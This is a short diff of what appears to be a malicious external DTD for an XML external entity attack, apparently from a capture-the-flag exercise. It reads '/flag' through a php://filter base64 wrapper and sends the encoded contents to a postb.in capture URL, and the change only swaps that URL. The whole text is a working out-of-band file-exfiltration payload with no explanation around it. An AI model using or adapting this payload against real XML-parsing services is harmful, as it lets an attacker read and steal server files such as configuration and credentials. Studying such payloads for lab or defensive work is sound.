@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
-<!ENTITY % final "<!ENTITY exfil SYSTEM 'https://www.postb.in/1733742763930-9964654732029/?d=%data;'>">
+<!ENTITY % final "<!ENTITY exfil SYSTEM 'https://www.postb.in/1733745832090-5208348131272/?d=%data;'>">
